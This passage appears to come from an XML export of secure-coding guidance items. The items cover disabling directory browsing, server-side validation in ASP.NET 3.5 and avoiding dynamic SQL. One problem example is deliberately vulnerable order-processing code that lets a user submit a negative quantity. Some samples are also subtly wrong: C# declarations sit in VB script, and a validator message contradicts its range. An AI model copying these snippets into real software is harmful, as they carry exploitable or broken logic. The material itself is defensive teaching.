&lt;pre&gt;&amp;lt;servlet&amp;gt;&lt;br&gt;      &amp;lt;servlet-name&amp;gt;default_servlet&amp;lt;/servlet-name&amp;gt;&lt;br&gt;      &amp;lt;servlet-class&amp;gt;&lt;br&gt;            org.apache.catalina.servlets.DefaultServlet&lt;br&gt;      &amp;lt;/servlet-class&amp;gt;&lt;br&gt;      &lt;strong&gt;&amp;lt;init-param&amp;gt;&lt;br&gt;&lt;/strong&gt;            &amp;lt;param-name&amp;gt;listings&amp;lt;/param-name&amp;gt;&lt;br&gt;            &amp;lt;param-value&amp;gt;false&amp;lt;/param-value&amp;gt;&lt;br&gt;&lt;strong&gt;      &amp;lt;/init-param&amp;gt;&lt;br&gt;&lt;/strong&gt;&amp;lt;/servlet&amp;gt;&lt;br&gt;&amp;lt;servlet-mapping&amp;gt;&lt;br&gt;      &amp;lt;servlet-name&amp;gt;default_servlet&amp;lt;/servlet-name&amp;gt;&lt;br&gt;      &amp;lt;url-pattern&amp;gt;/&amp;lt;/url-pattern&amp;gt;&lt;br&gt;&amp;lt;/servlet-mapping&amp;gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;An application is deployed on a production server. Unfortunately, the developers did not disable directory browsing. This allows an attacker to search for unprotected configuration files.&lt;/p&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;An application is deployed on a production server. Because the developers have disabled directory browsing, it is impossible for an attacker to use HTTP browsing to search for unprotected configuration files.&lt;/p&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:E99B2092-A623-447A-8461-1FD8F860AA15"&gt;Guideline: Remove Test Interfaces (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:4572037A-2166-4AD1-8E73-D623E468A7B9"&gt;Attack: Information Disclosure Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:1D7F6072-1A5F-472E-9D27-F15E396EAB2E"&gt;Attack: Forceful Browsing Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:1398DA02-651D-4798-95C3-7C3F8409004B"&gt;Checklist Item: Directory Browsing is Disabled (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>280d4fb4-9004-4304-8d93-a41b583f86cf</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Do Not Rely on Client-side Validation</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Input and Data Validation</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Do not rely on client-side validation for security purposes. Use server-side validation to ensure that data is safe and perform security decisions based on that. Client-side validation&amp;nbsp;should be used solely to&amp;nbsp;reduce round trips to the server and to improve
 the user experience.&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Client side validation can be easily bypassed. For example, a malicious user could disable&amp;nbsp;the client-side script routines by disabling JavaScript.&amp;nbsp;Users&amp;nbsp;may also construct their own&amp;nbsp;form posts using custom html, or&amp;nbsp;using an&amp;nbsp;HTTP proxy to modify form posts.&amp;nbsp;&amp;nbsp;If
 developers rely on the controls in the client's user interface and do not validate all results on the back end, it may introduce injection vulnerabilities that would allow an attacker to bypass data input restrictions and gain access to unintended application
 functionality.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;During implementation, ensure all input from&amp;nbsp;the client is&amp;nbsp;validated, even if the input is not stored.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;It's important to specify what input is acceptable, rather then trying to specify all&amp;nbsp;the&amp;nbsp;variations&amp;nbsp;of input that are&amp;nbsp;illegal (whitelisting as opposed to blacklisting).&amp;nbsp;Use ASP.NET validator controls to check user input on the server side and provide feedback
 to the user when input fails to pass validation requirements.&amp;nbsp;Follow these steps on each form page in an application:
&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Determine the required fields.&lt;/strong&gt; Use the required field validator control to ensure all required fields are present. Here is an example that declares a textfield in an ASP page that is a required field:&lt;/p&gt;
&lt;pre&gt;&amp;lt;td&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp; &amp;lt;asp:RequiredFieldValidator runat=server &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ControlToValidate=txtName&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ErrorMessage=&amp;quot;User ID is required.&amp;quot;&amp;gt; *&lt;br&gt;&amp;nbsp;&amp;nbsp; &amp;lt;/asp:RequiredFieldValidator&amp;gt;&lt;br&gt;&amp;lt;/td&amp;gt;&lt;br&gt;&amp;lt;td&amp;gt;User ID:&amp;lt;/td&amp;gt;&lt;br&gt;&amp;lt;td&amp;gt;&amp;lt;input type=text runat=server id=txtName&amp;gt;&amp;lt;/td&amp;gt;&lt;/pre&gt;
&lt;p&gt;The * is displayed next to the label if the input is blank. The error message is reported in a summary. The &amp;quot;ControlToValidate&amp;quot; property specifies the ID of the control to validate. The final step is to add a validation summary to the top of the page like
 so:&lt;/p&gt;
&lt;pre&gt;&amp;lt;asp:ValidationSummary runat=server &lt;br&gt;HeaderText=&amp;quot;There were errors on the page:&amp;quot; /&amp;gt;&lt;br&gt;&lt;/pre&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Enforce numeric range&amp;nbsp;constraints.&lt;/strong&gt; Use the RangeValidator control to ensure any numeric values are constrained to a specific, acceptable&amp;nbsp;range. Here is an example that declares an integer field&amp;nbsp;in an ASP page that has&amp;nbsp;a valid range from
 1 to 50:&lt;/p&gt;
&lt;pre&gt;&amp;lt;td&amp;gt;&lt;/pre&gt;
&lt;pre&gt;  &amp;lt;asp:RangeValidator id=&amp;quot;Range1&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ControlToValidate=&amp;quot;txtState&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; MinimumValue=&amp;quot;1&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; MaximumValue=&amp;quot;50&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Type=&amp;quot;Integer&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; EnableClientScript=&amp;quot;false&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Text=&amp;quot;The value must be from 1 to 10!&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; runat=&amp;quot;server&amp;quot;&amp;gt; * &lt;/pre&gt;
&lt;pre&gt;&amp;nbsp; &amp;lt;/asp:RangeValidator&amp;gt;&lt;br&gt;&amp;lt;/td&amp;gt;&lt;br&gt;&amp;lt;td&amp;gt;State:&amp;lt;/td&amp;gt;&lt;br&gt;&amp;lt;td&amp;gt;&amp;lt;input type=text runat=server id=txtState&amp;gt;&amp;lt;/td&amp;gt;&lt;/pre&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Validate&amp;nbsp;verification fields.&lt;/strong&gt; Fields such as password entry are often verified by having the user re-type them to ensure they are correct. Use the CompareValidator control to make the comparisons and ensure validity/integrity. Here is an
 example that declares&amp;nbsp;two password&amp;nbsp;fields&amp;nbsp;in an ASP page that&amp;nbsp;must match in order to validate properly:&lt;/p&gt;
&lt;pre&gt;&amp;lt;asp:CompareValidator runat=server&lt;br&gt;            ControlToValidate=txtRePWord&lt;br&gt;            ControlToCompare=txtPWord&lt;br&gt;             ErrorMessage=&amp;quot;Passwords do not match.&amp;quot; /&amp;gt;&lt;/pre&gt;
&lt;p&gt;In this case, the two fields being compared are &amp;quot;txtPWord&amp;quot; and &amp;quot;txtRePWord&amp;quot;. If they do not&amp;nbsp;match, validation fails with the error message, &amp;quot;Passwords do not match.&amp;quot;.&amp;nbsp;&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Enforce type constraints on string fields.&lt;/strong&gt; String fields are the most difficult type of input to effectively validate because the range of acceptable&amp;nbsp;characters is much larger then numeric&amp;nbsp;and enumerated types. Regular expression provide
 a flexible mechanism for dictating valid patterns and characters. Use the RegularExpressionValidator to perform a variety of checks on string-based fields such as zip codes and phone numbers.&amp;nbsp; Here is an example that declares an&amp;nbsp;text field&amp;nbsp;in an ASP page that
 should represent a five digit zip code, consisting entirely of numberic digits, and a validator to enforce those constraints:&lt;/p&gt;
&lt;pre&gt;&amp;lt;input type=text runat=server id=txtZip&amp;gt;&lt;br&gt;      &amp;lt;asp:RegularExpressionValidator runat=server&lt;br&gt;             ControlToValidate=&amp;quot;txtZip&amp;quot;&lt;br&gt;             ErrorMessage=&amp;quot;Zip code must be 5 digits, all numbers.&amp;quot;&lt;br&gt;             ValidationExpression=&amp;quot;[0-9]{5}&amp;quot;&amp;gt; * &lt;/pre&gt;
&lt;pre&gt;      &amp;lt;/asp:RegularExpressionValidator&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;lt;td&amp;gt;Zip code:&amp;lt;/td&amp;gt;&lt;br&gt;&amp;lt;td&amp;gt;&amp;lt;input type=text runat=server id=txtZip&amp;gt;&amp;lt;/td&amp;gt;&lt;/pre&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Use custom validation to handle remaining&amp;nbsp;input constraints.&lt;/strong&gt; The built-in ASP.NET&amp;nbsp;validation controls handle&amp;nbsp;most of the cases that commonly arise in&amp;nbsp;web applications, but there&amp;nbsp;may be&amp;nbsp;times when they are not appropriate.&amp;nbsp;The CustomValidator
 enables custom validation code that can plugs into the existing validation system.&amp;nbsp;Here is an example that declares a&amp;nbsp;text field&amp;nbsp;in an ASP page. For this particular text field, there is business logic that needs to be satisfied which is not easily constrainable
 by the&amp;nbsp;other&amp;nbsp;validation constructs, so a&amp;nbsp;custom validator is implementated that ensures the&amp;nbsp;string&amp;nbsp;in the text field&amp;nbsp;does not start&amp;nbsp;with the letter &amp;quot;a&amp;quot;:&lt;/p&gt;
&lt;pre&gt;&amp;lt;%@ Page Language=&amp;quot;vb&amp;quot; %&amp;gt;&lt;br&gt;&amp;lt;script runat=server&amp;gt;&lt;/pre&gt;
&lt;pre&gt;public sub CheckID(source as Object, args as ServerValidateEventArgs)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; args.IsValid = args.Value.substring(0, 1).tolower() &amp;lt;&amp;gt; &amp;quot;a&amp;quot;&lt;br&gt;end sub &lt;/pre&gt;
&lt;pre&gt;&amp;lt;/script&amp;gt;&lt;/pre&gt;
&lt;p&gt;To call this function, add a CustomValidator, which is designed to call developer code to perform its check. Here is the declaration:&lt;/p&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;asp:CustomValidator runat=server&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; controltovalidate=&amp;quot;txtName&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; errormessage=&amp;quot;ID is already in use.&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; OnServerValidate=&amp;quot;CheckID&amp;quot; /&amp;gt;&lt;/pre&gt;
&lt;p&gt;It is worth noting that this could have been done with the RegularExpression validation control, but in this case it makes more sense to use custom validation since&amp;nbsp;a type of high-level validation that could conceivably be more complex then a simple pattern
 match is being defined (e.g., the validation rules might change based on application state).&amp;nbsp;&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Use the Regex class to validate other sources&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Most Web applications accept input from various sources, including HTML controls, server controls, query strings, and cookies. Validate input from all of these sources to help prevent injection attacks. Use regular expressions to help validate input. The
 following example shows how to use the &lt;strong&gt;Regex&lt;/strong&gt; class. &lt;/p&gt;
&lt;pre&gt;using System.Text.RegularExpressions ;&lt;br&gt; // Instance method:Regex reg = new Regex(@&amp;quot;^[a-zA-Z'.\s]{1,40}$&amp;quot;);&lt;br&gt;Response.Write(reg.IsMatch(Request.QueryString[&amp;quot;Name&amp;quot;]));&lt;br&gt;// Static method:&lt;br&gt;if (!Regex.IsMatch(Request.QueryString[&amp;quot;Name&amp;quot;],@&amp;quot;^[a-zA-Z'.\s]{1,40}$&amp;quot;))&lt;br&gt; {&lt;br&gt;   // Name does not match expression&lt;br&gt; }&lt;/pre&gt;
&lt;p&gt;If you cannot cache your regular expression for frequent use, you should use the static
&lt;strong&gt;IsMatch&lt;/strong&gt; method where possible for performance reasons, to avoid unnecessary object creation.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;Consider a very simple form for an online shopping cart. The cart component consists of two components:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;An HTML form that contains all of the fields that make up the order to be submitted for processing:&lt;/p&gt;
&lt;pre&gt;&amp;lt;html&amp;gt;&lt;br&gt;  &amp;lt;head&amp;gt;&lt;br&gt;    &amp;lt;title&amp;gt;Widget shopping cart&amp;lt;/title&amp;gt;&lt;br&gt;  &amp;lt;/head&amp;gt;&lt;br&gt;  &amp;lt;body&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;  &amp;lt;H1&amp;gt;welcome to the most boring shopping cart on the web!&amp;lt;/H1&amp;gt; &lt;/pre&gt;
&lt;pre&gt;    A widget's current price is $19.95 USD. Please use the following form to submit an order.&lt;/pre&gt;
&lt;pre&gt;    &amp;lt;form action=&amp;quot;process_order.aspx&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;  &lt;br&gt;      &amp;lt;p&amp;gt;Please enter the number of widgets you would like to purchase:&amp;lt;/p&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;   quantity:&amp;lt;br/&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;  &amp;nbsp;&amp;lt;select name=&amp;quot;WidgetQuantity&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;  &amp;nbsp; &amp;lt;option value=&amp;quot;1&amp;quot;&amp;gt;1&amp;lt;/option&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   &amp;lt;option value=&amp;quot;2&amp;quot;&amp;gt;2&amp;lt;/option&amp;gt; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   &amp;lt;option value=&amp;quot;3&amp;quot;&amp;gt;3&amp;lt;/option&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   &amp;lt;option value=&amp;quot;4&amp;quot;&amp;gt;4&amp;lt;/option&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;  &amp;lt;/select&amp;gt;&lt;/pre&gt;
&lt;pre&gt;      ...&lt;br&gt;      &amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;order&amp;quot;/&amp;gt;&lt;br&gt;    &amp;lt;/form&amp;gt;&lt;/pre&gt;
&lt;pre&gt;  &amp;lt;/body&amp;gt;&lt;br&gt;&amp;lt;/html&amp;gt;&lt;/pre&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;An ASP.NET page that processes the form submissions and performs the necessary steps to create the order.&lt;/p&gt;
&lt;pre&gt;int&amp;nbsp;dQuantity = Request(&amp;quot;WidgetQuantity&amp;quot;);&lt;br&gt;double dPrice = 19.95;&lt;/pre&gt;
&lt;pre&gt;double dCost = dQuantity * dPrice;&lt;/pre&gt;
&lt;p&gt;This server side page is problematic because it lacks validation to ensure the quantity field is correct.&amp;nbsp;The application&amp;nbsp;works fine in the case where a user plays by the rules and submits the form as it is shown, because the&amp;nbsp;quantity field ensures that
 the range constraints for the order quantity are always valid.&amp;nbsp;However, if a clever user decides to construct their own form and submits a negative WidgetQuantity field, it causes a negative balance. Depending on what e-commerce system is used, this could
 result in a credit to the user's account. It also&amp;nbsp;might subtract the negative balance from the company's inventory, which would carry significant ramifications and costs&amp;nbsp;later on.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;Consider the following ASP.NET page that processes the form submissions and performs the necessary steps to create an order:&lt;/p&gt;
&lt;pre&gt;&amp;lt;%@ Page Language=&amp;quot;vb&amp;quot; %&amp;gt;&lt;br&gt;&amp;lt;script runat=server&amp;gt;&lt;br&gt;public sub OnSubmit(source as Object, e as EventArgs)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; if Page.IsValid then&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ' Now we can perform our transaction.&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; int dQuantity = Request(&amp;quot;WidgetQuantity&amp;quot;);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; double dPrice = 19.95;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; double dCost = dQuantity * dPrice;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; end if&lt;br&gt;end sub&lt;br&gt;&amp;lt;/script&amp;gt;&lt;br&gt;&amp;lt;html&amp;gt;&lt;br&gt;&amp;lt;head&amp;gt;&lt;br&gt;&amp;lt;title&amp;gt;Validation Sample&amp;lt;/title&amp;gt;&lt;br&gt;&amp;lt;/head&amp;gt;&lt;br&gt;&amp;lt;body&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;lt;form runat=server&amp;gt;&lt;br&gt;&amp;lt;asp:ValidationSummary runat=server headertext=&amp;quot;There were errors on the page:&amp;quot; /&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;lt;table&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;tr&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;td&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;asp:RequiredFieldValidator runat=server &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; controltovalidate=&amp;quot;WidgetQuantity&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; errormessage=&amp;quot;WidgetQuantity is required.&amp;quot;&amp;gt;*&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/asp:RequiredFieldValidator&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/td&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;td&amp;gt;A widget's current price is $19.95 USD. Please use the following form to submit an order.&amp;lt;/td&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;td&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;select name=&amp;quot;WidgetQuantity&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;option value=&amp;quot;1&amp;quot;&amp;gt;1&amp;lt;/option&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;option value=&amp;quot;2&amp;quot;&amp;gt;2&amp;lt;/option&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;lt;option value=&amp;quot;3&amp;quot;&amp;gt;3&amp;lt;/option&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;option value=&amp;quot;4&amp;quot;&amp;gt;4&amp;lt;/option&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/select&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;asp:RegularExpressionValidator runat=server display=dynamic&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; controltovalidate=&amp;quot;WidgetQuantity&amp;quot;&amp;nbsp; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; errormessage=&amp;quot;WidgetQuantity must be a non-zero, positive integer.&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; validationexpression=&amp;quot;[1-9]{1}[0-9]{0,7}&amp;quot; /&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/td&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;/tr&amp;gt;&lt;br&gt;...&lt;br&gt;&amp;lt;/table&amp;gt;&amp;lt;br&amp;gt;&lt;br&gt;&amp;lt;input type=submit runat=server id=cmdSubmit value=Submit onserverclick=OnSubmit&amp;gt;&lt;br&gt;&amp;lt;/form&amp;gt;&lt;br&gt;&amp;lt;/body&amp;gt;&lt;br&gt;&amp;lt;/html&amp;gt;&lt;/pre&gt;
&lt;p&gt;The ASP.NET Validator control provides client-side validation to reduce roundtrips to the server and improve user experience, but also provides server-side validation to&amp;nbsp;&amp;nbsp;ensure that the widget quantity field is&amp;nbsp;a positive integer. It is also validated as
 a required field that must be provided before submitting the order.&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnaspp/html/pdc_userinput.asp"&gt;User Input Validation in ASP.NET&amp;nbsp;&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="http://msdn2.microsoft.com/en-us/library/e5a8xz39.aspx"&gt;Validation Server Control Syntax
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Code_injection"&gt;General Purpose Code Injection article
&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:a1fc05ee-63a4-4568-b273-6ad485494a05"&gt;&lt;/a&gt;&lt;a href="?#ruledisplay:4cfb84e3-b640-44c1-8950-cc38262ce118"&gt;Application Does Not Rely Only on Request Validation&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:3f4ffd45-82e9-4bb3-8792-5d2ccc664dbe"&gt;Free Form Input is Sanitized to Protect Against Malicious Data&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:417133af-0ab8-4ad5-9aea-a59b08abf022"&gt;All the Input is Validated For Length, Range, Format, and Type&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>2c70968c-33b3-46a2-a157-c3022f3d7bd8</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Avoid Dynamic Queries that Accept User Input</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Data Access</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Avoid constructing SQL queries in code that include user input; instead, prefer parameterized stored procedures that use type safe SQL parameters.&amp;nbsp;If stored procedures&amp;nbsp;cannot be used, use parameterized dynamic SQL statements.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Database queries constructed dynamically&amp;nbsp;from user input&amp;nbsp;are susceptible to SQL injection. A successful SQL injection attack enables a malicious user to execute commands&amp;nbsp;on the&amp;nbsp;application's database instance by using the privileges granted to&amp;nbsp;the application's
 login. Using stored procedures with parameterized SQL is recommended because SQL parameters are type safe&amp;nbsp;and treated as&amp;nbsp;literal values by the database,&amp;nbsp;not as executable code. Parameters are also checked for type and length.
&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;Always use parameterized SQL queries. Avoid constructing SQL queries directly from&amp;nbsp;any input, including form fields, query string parameters, and cookies.&amp;nbsp;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;To protect&amp;nbsp;an application from SQL injection, perform the following steps:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Use parameters with stored procedures.&lt;/strong&gt; Stored procedures alone&amp;nbsp;will not prevent SQL injection.&amp;nbsp;Lack&amp;nbsp;of&amp;nbsp;parameter usage means that&amp;nbsp;stored procedures will be susceptible to SQL injection, especially if they use unfiltered input. The following
 code shows how to use SqlParameterCollection when calling a stored procedure:&lt;/p&gt;
&lt;pre&gt;using System.Data;&lt;br&gt;using System.Data.SqlClient;&lt;/pre&gt;
